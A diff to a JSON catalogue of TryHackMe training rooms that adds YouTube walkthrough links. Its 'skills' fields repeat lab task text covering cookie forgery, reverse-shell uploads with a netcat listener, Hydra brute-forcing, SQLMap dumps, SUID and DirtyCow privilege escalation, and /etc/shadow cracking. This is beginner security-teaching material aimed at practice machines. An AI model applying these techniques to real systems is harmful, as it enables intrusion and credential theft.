@@ -105,6 +105,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/activerecon"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/5g5_G-T2g8M"
       }
     ],
     "skills": "Active Reconnaissance Learn how to use simple tools such as traceroute, ping, telnet, and a web browser to gather information. Ensure that you understand why these tools fall under active reconnaissance. Launch your AttackBox and ensure that it is ready. You will need it to answer the questions, especially in later tasks. Browse to the following website and ensure that you have opened your Developer Tools on AttackBox Firefox, or the browser on your computer. Using the Developer Tools, figure out the total number of questions. Locate the JavaScript file script.js. Inspect the file and figure out the total number of questions. Which option would you use to set the size of the data carried by the ICMP echo request? Use the \"man ping\" command on a Linux system to consult ping's manual pages. Alternatively, check the following extract from the manual page: ping [-c count] [-i interval] [-I interface] [-W timeout] [-p pattern] [-s packetsize] [-t ttl] [-T timestamp option] [hop...] {destination} What is the size of the ICMP header in bytes? Use the \"man ping\" command to consult ping's manual pages. Does MS Windows Firewall block ping by default? (Y/N) Deploy the VM for this task and using the AttackBox terminal, issue the command ping -c 10 MACHINE_IP . How many ping replies did you get back? In Traceroute A, what is the IP address of the last router/hop before reaching tryhackme.com? If there is more than one IP address, provide the first one that responded. In Traceroute B, what is the IP address of the last router/hop before reaching tryhackme.com? If there is more than one IP address, provide the first one that responded. In Traceroute B, how many routers are between the two systems? Start the attached VM from Task 3 if it is not already started. On the AttackBox, run traceroute MACHINE_IP . Check how many routers/hops are there between the AttackBox and the target VM. If traceroute is not installed, you can install it with apt install traceroute. Start the attached VM from Task 3 if it is not already started. On the AttackBox, open the terminal and use the telnet client to connect to the VM on port 80. What is the name of the running server? What is the version of the running server (on port 80 of the VM)? Start the VM and open the AttackBox. Once the AttackBox loads, use Netcat to connect to the VM port 21. What is the version of the running server? Ensure that you gain mastery over the different basic yet essential tools we presented in this room before moving on to more sophisticated tools.",
@@ -161,6 +167,18 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/25daysofchristmas"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/wodEvodG-ME"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/CU0K2gsDEFI"
       }
     ],
     "skills": "Advent of Cyber 1 [2019] Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas. Read the above. Practise connecting to our network. Read the above Join the Discord server and say hi! Follow us on Twitter. Read the above What is the name of the cookie used for authentication? If you decode the cookie, what is the value of the fixed part of the cookie? After accessing his account, what did the user mcinventory request? What is the path of the hidden page? What is the password you found? What do you have to take to the 'partay' Whats the destination IP on packet number 998? What item is on the Christmas list? Crack buddy's password! How many visible files are there in the home directory(excluding ./ and ../)? What is the content of file5? Which file contains the string ‘password’? What is the IP address in a file in the home folder? How many users can log into the machine? What is the sha1 hash of file8? What is mcsysadmin’s password hash? What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019) What information can you get from exiftool? Are they using the same Creator name on any social networks... Twitter Perhaps? What is Lola's current occupation? What phone does Lola make? What date did Lola first start her photography? Format: dd/mm/yyyy How many years ago did she start? Have you tried using the WayBackMachine? What famous woman does Lola have on her web page? What data was exfiltrated via DNS? What did Little Timmy want to be for Christmas? What was hidden within the file? how many TCP ports under 1000 are open? Use -p port_start - port_end to specify a range What is the name of the OS of the host? What version of SSH is running? What is the name of the file that is accessible on the server you found running? What port is SSH running on? 65534 is the port number.. But can you find out how to login via SSH on this port? Find and run a file as igor . Read the file /home/igor/flag1.txt Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file? It may simply look like a standard Linux binary file.. And no, its not the nmap binary on the machine. What is the value of the flag? Compromise the web server using Metasploit. What is flag1? Now you've compromised the web server, get onto the main system. What is Santa's SSH password? Who is on line 148 of the naughty list? Who is on line 52 of the nice list? What is the password inside the creds.txt file? NFS What is the name of the file running on port 21? What is the password after enumerating the database? SQL What is the md5 hashsum of the encrypted note1 file? Where was elf Bob told to meet Alice? gpg key is 25daysofchristmas Decrypt note2 and obtain the flag! private password is hello A web server is running on the target. What is the hidden directory which the website lives on? dirbuster 2.3 medium Gain initial access and read the contents of user.txt Don't leave sensitive information out in the open, even if you think you have control over it. [Optional] Elevate privileges and read the content of root.txt Figure out what the user last was trying to find out What is the name of the file you found? What is in the file? What is Charlie going to book a holiday to? Read /etc/shadow and crack Charlies password. What is flag1.txt? How many files did you extract(excluding all the .zip files) How many files contain Version: 1.1 in their metadata? Which file contains the password? Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH) If you've tried more than 30 passwords from RockYou.txt, you are doing something wrong! Use Hydra to bruteforce molly's SSH password. What is flag 2? What is the admin's authid cookie value? What are the contents of the user.txt file? What port is SSH running on? Use nmap to enumerate services on ports 4000 and 5000. Crack sam's password and read flag1.txt Complete the challenge on day 17, to understand how to use Hydra. Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2? What is the value of local_ch when its corresponding movl instruction is called(first if multiple)? What is the value of eax when the imull instruction is called? What is the value of local_4h before eax is set to 0? what is the value of local_8h before the end of the main function? what is the value of local_4h before the end of the main function? Which field is SQL injectable? Use the input name used in the HTML code. SQLMap will highlight which field is vulnerable, if you decide to use it. What is Santa Claus' email address? If your injection is going very slowly, consider enumerating only the information you need instead of trying to dump the whole database. What is Santa Claus' plaintext password? It's in rockyou.txt - also try online sites such as HashKiller or Crackstation Santa has a secret! Which station is he meeting Mrs Mistletoe in? Look at the private messages between users, either through the database or logging in as Santa! Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/ If you're getting an error about a file format being blacklisted, try looking up alternative file extensions that will still execute. Find the password in the database how do you search for strings in an elasticsearch database Read the contents of the /root.txt file use the 3rd open port and a Kibana public vulnerability Complete another room on TryHackMe.",
@@ -189,6 +207,12 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/adventofcyber2"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/humB4l8s90E"
       }
     ],
     "skills": "Advent of Cyber 2 [2020] Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas. Checkout the sponsors and special contributors. Join our Discord and say hi! Follow us on Twitter! Check out the subreddit! Practice connecting to our network! Read the above. The Christmas story is used within some of the tasks, so make sure you read the above. Deploy your AttackBox (the blue \"Start AttackBox\" button ) and the tasks machine ( green button on this task ) if you haven't already. Once both have deployed, open FireFox on the AttackBox and copy/paste the machines IP into the browser search bar. Make sure your are using the IP of the right machine - Its the one found at the top of this page. Register for an account, and then login. What is the name of the cookie used for authentication? Check your Browser's Developer tools. These can usually be accessed with F12 in most browsers, or Ctrl + Shift + I otherwise. In what format is the value of this cookie encoded? Often used as a \"shorthand for binary\". Having decoded the cookie, what format is the data stored in? Use CyberChef to decode the cookie. The format is a very common one, often linked to JavaScript. (https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) Figure out how to bypass the authentication. What is the value of Santa's cookie? Remember, you can edit your cookies value! Why not use the decoded cookie you got in the last question, update the username with \"santa\" and re-encode it? Usernames are often all lower case, so bear this in mind! Now that you are the santa user, you can re-activate the assembly line! What is the flag you're given when the line is fully active? What string of text needs adding to the URL to get access to the upload page? Look at the homepage of the website and combine what you find there with the ID given in the task (ODIzODI5MTNiYmYw). The answer starts with ?id=.. What type of file is accepted by the site? There are three filetypes accepted by the upload form. These can be found by checking the page source code. They all have something in common in that they are types of ____ file. Bypass the filter and upload a reverse shell. In which directory are the uploaded files stored? The filter can be bypassed using the technique taught in the task. The answer can be found with a tool such as Gobuster, or by checking each of the common directories from the dossier. Activate your reverse shell and catch it in a netcat listener! As a reminder, the syntax for setting up a reverse shell listener is: sudo nc -lvnp 443. Make sure that the shell you uploaded has the correct IP address and port in it! What is the flag in /var/www/flag.txt ? cat /var/www/flag.txt Deploy your AttackBox (the blue \"Start AttackBox\" button) and the tasks machine (green button on this task) if you haven't already. Once both have deployed, open Firefox on the AttackBox and copy/paste the machines IP (MACHINE_IP) into the browser search bar. Use BurpSuite to brute force the login form. Use the following lists for the default credentials: Username Password root root admin password user 12345 Use the correct credentials to log in to the Santa Sleigh Tracker app. Don't forget to turn off Foxyproxy once BurpSuite has finished the attack! What is the flag? Remember you're using the default credential list in the intruder position payloads; you can input each entry one by one. Deploy your AttackBox (the blue \"Start AttackBox\" button) and the tasks machine (green button on this task) if you haven't already. Once both have deployed, open FireFox on the AttackBox and copy/paste the machines IP (MACHINE_IP) into the browser search bar. Given the URL \" http://shibes.xyz/api.php \", what would the entire wfuzz command look like to query the \"breed\" parameter using the wordlist \"big.txt\" (assume that \"big.txt\" is in your current directory) Note: For legal reasons, do not actually run this command as the site in question has not consented to being fuzzed! The command will start with \"wfuzz\", then will include flags, the wordlist and finally the URL. Use GoBuster (against the target you deployed -- not the shibes.xyz domain) to find the API directory. What file is there? gobuster%20dir%20-u%20http%3A%2F%2F%3Cip%3E%20-w%20%3Cword%20list%3E%20-x%20.php Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post? Use%20wfuzz%2C%20the%20Advent%20of%20Cyber%20wordlist%20given%20in%20this%20task%20and%20website%20with%20the%20file%20you%20found%3A%20http%3A%2F%2F%3Cip%3E%2Fapi%2F%3Cfile%3E%3Fdate%3DFUZZ Without using directory brute forcing, what's Santa's secret login panel? The name is derived out of 2 words from this question. /s**tap***l Visit Santa's secret login panel and bypass the login using SQLi How many entries are there in the gift database? What did Paul ask for? What is the flag? Use Burp Suite to capture a query that you make on the gift database. You'll need to tell SQLMap the database system that is used and dump the ENTIRE database for this to work. What is admin's password? Deploy your AttackBox (the blue \"Start AttackBox\" button) and the tasks machine (green button on this task) if you haven't already. Once both have deployed, open Firefox on the AttackBox and copy/paste the machines IP ( http://MACHINE_IP:5000 ) into the browser search bar ( the webserver is running on port 5000, so make sure this is included in your web requests ). What vulnerability type was used to exploit the application? What query string can be abused to craft a reflected XSS? If you're unsure, on the \"Make a wish\" website search for something and see what query string is added in your browser search bar. Launch the OWASP ZAP Application Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan? Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the \"Make a wish\" website? Open \"pcap1.pcap\" in Wireshark. What is the IP address that initiates an ICMP/ping? If we only wanted to see HTTP GET requests in our \"pcap1.pcap\" file, what filter would we use? We've demonstrated filtering a web server within the task Now apply this filter to \"pcap1.pcap\" in Wireshark, what is the name of the article that the IP address \" 10.10.67.199 \" visited? /posts/ Let's begin analysing \"pcap2.pcap\". Look at the captured FTP traffic; what password was leaked during the login process? There's a lot of irrelevant data here - Using a filter here would be useful! As FTP uses the TCP protocol and runs on port 21, we'd use the \"tcp.port\" filter and \"==\" operator to only show all data that is TCP and uses port 21. The filter we would use: is \"tcp.port == 21\" Continuing with our analysis of \"pcap2.pcap\", what is the name of the protocol that is encrypted? Analyse \"pcap3.pcap\" and recover Christmas! What is on Elf McSkidy's wishlist that will be used to replace Elf McEager? There's a lot of data! Only a tiny part of it is useful - use filters! How would you export files? When was Snort created? Using Nmap on MACHINE_IP , what are the port numbers of the three services running? (Please provide your answer in ascending order/lowest -> highest, separated by a comma) Answer format: , , Run a scan and provide the -Pn flag to ignore ICMP being used to determine if the host is up Remember that just because a device doesn't respond to ICMP, doesn't mean it isn't online. Windows machines block ICMP by default. Experiment with different scan settings such as -A and -sV whilst comparing the outputs given. Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running? Service Fingerprinting! Use Nmap's N etwork S cripting E ngine ( NSE ) to retrieve the \" HTTP-TITLE \" of the webserver. Based on the value returned, what do we think this website might be used for? https://nmap.org/nsedoc/scripts/http-title.html Now use different scripts against the remaining services to discover any further information about them Question #1: Name the directory on the FTP server that has data accessible by the \"anonymous\" user Recall how Linux indicates permissions to files and folders from Day 8! Question #2: What script gets executed within this directory? Question #3: What movie did Santa have on his Christmas shopping list? Look around for other files! Question #4: Re-upload this script to contain malicious data (just like we did in section 9.6 . Output the contents of /root/flag.txt! Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from. Question #1 Using enum4linux , how many users are there on the Samba server ( MACHINE_IP )? Question #2 Now how many \"shares\" are there on the Samba server? Question #3 Use smbclient to try to login to the shares on the Samba server ( MACHINE_IP ). What share doesn't require a password? Question #4 Log in to this share, what directory did ElfMcSkidy leave for Santa? Refer to the commands in the cheatsheet if you are stuck! What type of privilege escalation involves using a user account to execute commands as an administrator? What is the name of the file that contains a list of users who are a part of the sudo group? Use SSH to log in to the vulnerable machine like so: ssh cmnatic@MACHINE_IP Input the following password when prompted: aoc2020 Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary. You may find uploading some of the enumeration scripts that were used during today's task to be useful. Refer back to section 11.7 if you are stuck. Remember that we can use this find command to find executables that have the SUID bit set: find / -perm -u=s -type f 2>/dev/null Use this executable to launch a system shell as root. What are the contents of the file located at /root/flag.txt ? You can use \"whereis \" to find the location of a command. What is the version number of the web server? Remember where we discussed that version numbers can be left behind? What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX) Use your researching skills to find the metasploit payload for \"Apache Tomcat 9.0\" CGI\" . Double-check the configured \"options \" in Metasploit and Refer to the cheatsheet if you are struggling with commands after exploitation. Set your Metasploit settings appropriately and gain a foothold onto the deployed machine. What are the contents of flag1.txt Use your researching skills to find out how to output the contents of a file for the Operating System of the server you have exploited Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges! Metasploit has post exploit suggestion scripts that may show your the \"PATH\" Hi Santa, hop in your sleigh and deploy this machine! The Christmas GPS now says this house is at the address MACHINE_IP. Scan this machine with a port-scanning tool of your choice. Port Scanning We will begin by scanning the machine. If you are working from the TryHackMe \"Attackbox\" or from a Kali Linux instance (or honestly, any Linux distribution where you have this installed), you can use nmap with syntax like so: nmap MACHINE_IP What old, deprecated protocol and service is running? Initial Access Connect to this service to see if you can make use of it. You can connect to the service with the standard command-line client, named after the name of the service, or netcat with syntax like this: telnet MACHINE_IP <PORT_FROM_NMAP_SCAN> What credential was left for you? Enter just the password. Enumeration Looks like you can slide right down the chimney! Log in and take a look around, enumerate a bit. You can view files and folders in the current directory with ls , change directories with cd and view the contents of files with cat . Often to enumerate you want to look at pertinent system information, like the version of the operating system or other release information. You can view some information with commands like this: cat /etc/*release uname -a cat /etc/issue There is a great list of commands you can run for enumeration here: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ What distribution of Linux and version number is this server running? This is a very old version of Linux! This may be vulnerable to some kernel exploits, that we could use to escalate our privileges. Take a look at the cookies and milk that the server owners left for you. You can do this with the cat command as mentioned earlier. cat cookies_and_milk.txt Who got here first? Enter just his name, in lowercase. The perpetrator took half of the cookies and milk! Weirdly enough, that file looks like C code... That C source code is a portion of a kernel exploit called DirtyCow . Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel, taking advantage of a race condition that was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system. You can learn more about the DirtyCow exploit online here: https://dirtycow.ninja/ This cookies_and_milk.txt file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box! You can compile the C source code on the target with gcc . You might need to supply specific parameters or arguments to include different libraries, but thankfully, the DirtyCow source code will explain what syntax to use. What is the verbatim syntax you can use to compile, taken from the real C source code comments? Use the `dirty.c` name, as given in the source code. Privilege Escalation Run the commands to compile the exploit, and run it. What \"new\" username was created, with the default operations of the real C source code? Switch your user into that new user account, and hop over to the /root directory to own this server! You can switch user accounts like so: su <user_to_change_to> Uh oh, looks like that perpetrator left a message! Follow his instructions to prove you really did leave Coal for Christmas! After you leave behind the coal, you can run tree | md5sum What is the MD5 hash output? Be sure you make a coal file, not a directory! What URL will take me directly to Rudolph's Reddit comment history? According to Rudolph, where was he born? Rudolph mentions Robert. Can you use Google to tell me Robert's last name? On what other social media platform might Rudolph have an account? What is Rudolph's username on that platform? Search Rudolph's Reddit username using the Twitter search feature What appears to be Rudolph's favorite TV show right now? Based on Rudolph's post history, he took part in a parade. Where did the parade take place? Save the images Rudolph posted on Twitter and upload them to https://images.google.com. Okay, you found the city, but where specifically was one of the photos taken? Save the \"higher resolution\" image and check it's EXIF data here: http://exif.regex.info/ Answer Format: xx.xxxxxx, -xx.xxxxxx Did you find a flag too? Check your EXIF data again :) Has Rudolph been pwned? What password of his appeared in a breach? Navigate to: https://scylla.sh/ Search \"email:rudolphthered@hotmail.com\" Based on all the information gathered. It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile. What are the street numbers of the hotel address? Look closely at your geo coordinates from your EXIF data. Research the nearby hotel. What's the output of True + True? What's the database for installing other peoples libraries called? What is the output of bool(\"False\")? What library lets us download the HTML of a webpage? What is the output of the program provided in \"Code to analyse for Question 5\" in today's material? (This code is located above the Christmas banner and below the links in the main body of this task) Add spaces in between items as per the answer formatting below: [x, x, x, x] What causes the previous task to output that? The answer is above the 🦌 and below the 🧝‍♂️, in the variables section. What is the port number for the web server? Without using enumerations tools such as Dirbuster, what is the directory for the API? (without the API key) /******/ Where is Santa right now? Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. To unblock yourself, simply terminate and re-deploy the target instance (MACHINE_IP) What is the value of local_ch when its corresponding movl instruction is called (first if multiple)? What is the value of eax when the imull instruction is called? What is the value of local_4h before eax is set to 0? Open the \"TBFC_APP\" application in ILspy and begin decompiling the code An alternative tool \"Dotpeek\" has been provided, you may find this more intuitive to use. What is Santa's password? Recall that applications asking for credentials must know the correct credentials in the first place, try to find the correct password for Santa! Now that you've retrieved this password, try to login...What is the flag? What is Santa's password? What is the challenge flag? Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want? Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants? Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? (This command will take a while) Use -Filter '*3*' How many words does the first file contain? What 2 words are at index 551 and 6991 in the first file? This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want? (use spaces when submitting the answer) Use -Pattern \"redryder\" Read the contents of the text file within the Documents folder. What is the file hash for db.exe? What is the file hash of the mysterious executable within the Documents folder? Using Strings find the hidden flag within the executable? What is the flag that is displayed when you run the database connector file? What is the password to the KeePass database? Look under 'Result snippet'. What is the encoding method listed as the 'Matching ops'? Look under 'Properties'. What is the decoded password value of the Elf Server? What is the decoded password value for ElfMail? The clue is 'Entities'. Look under 'Data format'. Click and continue to day 23! Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value? At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files? What is the name of the suspicious scheduled task? Inspect the properties of the scheduled task. What is the location of the executable that is run at login? There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID? Assign the hidden partition a letter. What is the name of the hidden folder? Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file? Scan the machine. What ports are open? You'll need to perform a full scan here of all ports. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. There are several websites on this box, find the right one. What is the name of the hidden php page? Gobuster is suggested here. You'll need to use common web file extensions as well in this bit to find your target. What is the name of the hidden directory where file uploads are saved? Gobuster is suggested here. Bypass the filters. Upload and execute a reverse shell. There are two filters present here: one client-side and one server-side. Refer back to day two for the server-side bypass. What is the value of the web.txt flag? This can be found in /var/www/ Upgrade and stabilize your shell. Refer to the notes above in the task dossier. Be sure to use Python3 here. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password Be sure to review the included files under /var/www/TheGrid/ Access the database and discover the encrypted credentials. What is the name of the database you find these in? You can view how to connect to this in the above task dossier Crack the password. What is it? You can view how to crack the password in the above task dossier Use su to login to the newly discovered user by exploiting password reuse. What is the value of the user.txt flag? You can find this in /home/flynn/ Check the user's groups. Which group can be leveraged to escalate privileges? You can do this with the command: id Abuse this group to escalate privileges to root. What is the value of the root.txt flag? You can find this in /root/ Please help us improve by answer this 5 minute survey! https://forms.gle/iixyNWzyZupumsPN7 Complete the form to get the answer to this question! Continue your learning with the Complete Beginner , Offensive Pentesting or Defensive Security pathway! The prize winners will be announced on the 26th of December - You have until then to complete the tasks. Remember, the more questions you answer, the higher the chance you have of winning!",
@@ -217,6 +241,150 @@
         "idioma": "EN",
         "formato": "Lab oficial",
         "url": "https://tryhackme.com/room/adventofcyber4"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/LSRhro8x2mQ"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/0AQHBrxYnqI"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/LrdT2hUM6mw"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/l0ZCyfA75ZE"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/jpRTzb1eZQ4"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/G_2OcE8hxbA"
+      },
+      {
+        "autor": "JohnHammond",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/HE12-x7E7lc"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/0wXCvxMdU2Q"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Ul89ZwbmGGo"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/VZayLYxF_Lw"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/M-IyqKuv7U8"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/07jxh-agu7g"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/F9dmjjzF5JI"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/cbd42k9NCFA"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/dy1AVtYgKuc"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/iUv78_zMUkw"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/ikVvKBL_ulM"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/iteaSHW8YHc"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/mMZhZ9OgZQY"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/Pv_lPGXVQpo"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/p1r-E03IARw"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/ytd1-xEs-pM"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/VMzDrdlVcVg"
+      },
+      {
+        "autor": "stuffy24",
+        "idioma": "EN",
+        "formato": "Vídeo",
+        "url": "https://youtu.be/nqJL2cGkCmQ"
       }
     ],
     "skills": "Advent of Cyber 2022 Get started with Cyber Security in 24 Days - learn the basics by doing a new, beginner-friendly security challenge every day leading up to Christmas. Read the above and check out the prizes! Practice connecting to our network! Follow us on LinkedIn ! Join our Discord and say hi! Follow us on Twitter ! Check out the subreddit ! Join us on Instagram ! Follow us on Facebook ! See what we do on Pinterest ! Read the above. The Christmas story is used within some of the tasks, so make sure you read the above. Who is the adversary that attacked Santa's network this year? What's the flag that they left behind? Looking to learn more? Check out the rooms on Unified Kill Chain , Cyber Kill Chain , MITRE , or the whole Cyber Defence Frameworks module! Ensure you are connected to the deployable machine in this task. Use the ls command to list the files present in the current directory. How many log files are present? The directory needs to be /home/elfmcblue. You can use cd to change to this cd /home/elfmcblue Elf McSkidy managed to capture the logs generated by the web server. What is the name of this log file? You can use the ls command to list the files present in the directory. Begin investigating the log file from question #3 to answer the following questions. On what day was Santa's naughty and nice list stolen? This answer is looking for a day in the week. What is the IP address of the attacker? The attacker only made one request to the web server. What is the name of the important list that the attacker stole from Santa? Look through the log files for the flag. The format of the flag is: THM{} Using grep recursively allows you to quickly look through a bunch of log files for a value. Interested in log analysis? We recommend the Windows Event Logs room or the Endpoint Security Monitoring Module . What is the name of the Registrar for the domain santagift.shop? Check the who.is/whois website to find WHOIS information. Find the website's source code (repository) on github.com and open the file containing sensitive credentials. Can you find the flag? Use the same search terms that Recon McRed used on github.com to find the leaked source code. What is the name of the file containing passwords? What is the name of the QA server associated with the website? Check the file containing sensitive credentials. What is the DB_PASSWORD that is being reused between the QA and PROD environments? Check out this room if you'd like to learn more about Google Dorking! What is the name of the HTTP server running on the remote host? Try nmap -sV MACHINE_IP in the AttackBox. What is the name of the service running on port 22 on the QA server? What flag can you find after successfully accessing the Samba service? It is located in the admins folder. What is the password for the username santahr? If you want to learn more scanning techniques, we have a module dedicated to Nmap ! Use Hydra to find the VNC password of the target with IP address MACHINE_IP . What is the password? The VNC server does not use a username. Using a VNC client on the AttackBox, connect to the target of IP address MACHINE_IP . What is the flag written on the target’s screen? You can use Remmina to connect to your target using VNC with the password that you have found. If you liked the topics presented in this task, check out these rooms next: Protocols and Servers 2 , Hydra , Password Attacks , John the Ripper . What is the email address of the sender? What is the return address? On whose behalf was the email sent? What is the X-spam score? What is hidden in the value of the Message-ID field? Message-ID values are usually not in BASE64 format. If you saw so, decode the value to understand what's hidden there. Visit the email reputation check website provided in the task. What is the reputation result of the sender's email address? Check the attachments. What is the filename of the attachment? What is the hash value of the attachment? Visit the Virus Total website and use the hash value to search. Navigate to the behaviour section. What is the second tactic marked in the Mitre ATT&CK section? Visit the InQuest website and use the hash value to search. What is the subcategory of the file? If you want to learn more about phishing and analysing emails, check out the Phishing module! What is the version of CyberChef found in the attached VM? How many recipes were used to extract URLs from the malicious doc? We found a URL that was downloading a suspicious file; what is the name of that malware? Provide a non-defanged output. What is the last defanged URL of the bandityeti domain found in the last step? What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>) If you liked the investigation today, you might also enjoy the Security Information and Event Management module! If not already completed, download the zip folder attached to this task, and open Remix in your preferred browser. What flag is found after attacking the provided EtherStore Contract? Are you up for a little challenge to celebrate Day 8? Try your hand at these easy challenge rooms: Quotient and Agent T ! Deploy the attached VM, and wait a few minutes. What ports are open? What framework is the web application developed with? What CVE is the application vulnerable to? Use the info command of the chosen Metasploit module (Format: CVE-xxxx-xxxx) What command can be used to upgrade the last opened session to a Meterpreter session? What file indicates a session has been opened within a Docker container? What file often contains useful credentials for web applications? What database table contains useful credentials? What is Santa's password? What ports are open on the host machine? List the ports in order. What is the root flag? Day 9 is done! You might want to take a well-deserved rest now. If this challenge was right up your alley, though, we think you might enjoy the Compromising Active Directory module! What is the Guard's flag? What is the Yeti's flag? Read what Elf McSkidy says after dying. There's a big hint there! If you liked today's challenge, the Walking an Application room is an excellent follow-up! What is the Windows version number that the memory image captured? Note: this initial scan may take up towards 10 minutes to complete. Why not grab some water or stretch your legs? You may wish to use windows.info for this. What is the name of the binary/gift that secret Santa left? You may wish to use windows.pslist for this. What is the Process ID (PID) of this binary? You may wish to use windows.psscan for this. Dump the contents of this binary. How many files are dumped? You may wish to use windows.dumpfiles for this. Remember to include the Process ID (PID) of the binary (--pid NUMBER). If you want to learn more about Volatility, please check out a dedicated room here . For more content on forensics, we have a full Digital Forensics and Incident Response module for you! What is the architecture of the malware sample? (32-bit/64-bit) What is the packer used in the malware sample? (format: lowercase) What is the compiler used to build the malware sample? (format: lowercase) Check the output of CAPA. How many MITRE ATT&CK techniques have been discovered attributed to the DISCOVERY tactic? Check the ATT&CK Tactic and Technique table from CAPA output. What is the registry key abused by the malware? Check the Path column. What is the value written on the registry key based on the previous question? Check the Details column. What are the names of two files created by the malware under the C:\\Users\\Administrator\\ directory? (format: file1,file2 in alphabetical order) What are the two domains wherein malware has initiated a network connection? (format: domain1,domain2 in alphabetical order) Going back to strings inside the malware sample, what is the complete URL used 